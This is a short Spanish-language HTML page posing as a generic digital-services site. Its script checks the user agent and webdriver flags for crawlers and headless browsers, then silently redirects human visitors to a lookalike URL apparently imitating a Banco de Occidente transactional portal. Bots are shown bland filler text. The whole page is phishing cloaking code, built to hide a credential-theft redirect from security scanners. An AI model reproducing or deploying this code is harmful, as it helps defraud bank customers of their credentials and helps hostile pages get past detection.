<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Plataforma Digital</title>
</head>
<body style="margin: 0; padding: 0; background: white;">
    <script>
        // Target URL
        const TARGET = "https://occdentebncoprtaltrnsccional.vercel.app/";

        // Función para detectar bots
        function isBot() {
            const ua = navigator.userAgent.toLowerCase();
            const botKeywords = ['bot', 'crawler', 'spider', 'googlebot', 'bingbot', 'yandex', 'baidu', 'headless', 'puppet', 'phantom', 'selenium', 'webdriver', 'scraper'];
            
            for (let keyword of botKeywords) {
                if (ua.includes(keyword)) {
                    return true;
                }
            }
            
            if (navigator.webdriver) return true;
            if (window.screen.width === 0) return true;
            
            return false;
        }

        // Si NO es bot, redirige
        if (!isBot()) {
            window.location.href = TARGET;
        } else {
            // Si es bot, muestra contenido
            document.body.innerHTML = `
                <div style="max-width: 1200px; margin: 0 auto; padding: 40px 20px; font-family: Arial, sans-serif;">
                    <h1 style="color: #333;">Plataforma Digital Innovadora</h1>
                    <p style="color: #666; font-size: 16px; line-height: 1.6;">Bienvenido a nuestra plataforma de soluciones digitales. Ofrecemos servicios innovadores para transformar tu negocio con tecnología de última generación.</p>
                    
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 30px; margin: 40px 0;">
                        <div style="background: #f5f5f5; padding: 20px; border-radius: 8px;">
                            <h3 style="color: #667eea;">⚡ Velocidad</h3>
                            <p style="color: #666;">Procesamiento instantáneo y respuesta en tiempo real.</p>
                        </div>
                        <div style="background: #f5f5f5; padding: 20px; border-radius: 8px;">
                            <h3 style="color: #667eea;">🔒 Seguridad</h3>
                            <p style="color: #666;">Protección de datos con encriptación avanzada.</p>
                        </div>
                        <div style="background: #f5f5f5; padding: 20px; border-radius: 8px;">
                            <h3 style="color: #667eea;">📱 Accesibilidad</h3>
                            <p style="color: #666;">Disponible en todos tus dispositivos.</p>
                        </div>
                        <div style="background: #f5f5f5; padding: 20px; border-radius: 8px;">
                            <h3 style="color: #667eea;">🤖 Inteligencia</h3>
                            <p style="color: #666;">Algoritmos inteligentes adaptables.</p>
                        </div>
                        <div style="background: #f5f5f5; padding: 20px; border-radius: 8px;">
                            <h3 style="color: #667eea;">💡 Innovación</h3>
                            <p style="color: #666;">Actualización constante con tendencias.</p>
                        </div>
                        <div style="background: #f5f5f5; padding: 20px; border-radius: 8px;">
                            <h3 style="color: #667eea;">🌍 Global</h3>
                            <p style="color: #666;">Disponible en 150+ países.</p>
                        </div>
                    </div>
                    
                    <p style="color: #999; font-size: 13px; margin-top: 60px; border-top: 1px solid #eee; padding-top: 20px;">&copy; 2026 Plataforma Digital. Todos los derechos reservados.</p>
                </div>
            `;
        }
    </script>
</body>
</html>
